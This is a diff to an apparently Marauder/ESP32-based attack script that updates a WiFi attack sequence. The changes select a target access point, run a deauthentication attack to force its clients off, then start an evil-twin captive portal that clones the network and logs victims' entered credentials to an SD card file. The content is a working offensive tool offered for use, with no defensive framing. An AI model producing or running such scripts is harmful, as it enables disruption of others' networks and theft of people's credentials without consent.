@@ -59,15 +59,26 @@ PLATFORM LINUX
 # Type the scan results into the editor
 WIFI_RESULT
 
-# ── Phase 2: Deauth ─────────────────────────────────────────────────────────
-# Force clients off the target AP
-WIFI_DEAUTH {{AP_INDEX}}
+# ── Phase 2: Select target + deauth ─────────────────────────────────────────
+# Select the target AP by index, then run a targeted deauth against it to
+# force its clients to disconnect (and re-connect through the evil twin).
+# Marauder CLI: 'select -a <idx>' then 'attack -t deauth'.
+WIFI_CMD select -a {{AP_INDEX}}
+WIFI_WAIT 500
+WIFI_CMD attack -t deauth
 WIFI_WAIT {{DEAUTH_SEC}}000
+WIFI_STOP
 
 # ── Phase 3: Evil Twin Portal ─────────────────────────────────────────────
-# Note: evilportal command is sent to Marauder via the UART bridge.
-# The portal will clone the target SSID and serve the captive portal page.
-# Credentials captured by Marauder are saved to SD: /logs/evil_portal.log
+# Launch the captive portal on the ESP32.  Marauder serves the portal HTML
+# staged on its SD card and logs captured credentials to /logs/evil_portal.log.
+# Configure the served page + AP SSID on the ESP32 beforehand, e.g.:
+#   evilportal -c set html /portals/{{PORTAL}}
+#   evilportal -c set ap   <cloned SSID from scan index {{AP_INDEX}}>
+# then this module starts it:
+WIFI_CMD evilportal -c set html /portals/{{PORTAL}}
+WIFI_WAIT 500
+WIFI_CMD evilportal -c start
 #
 # After execution, check /logs/evil_portal.log on the ESP32 SD card.
 
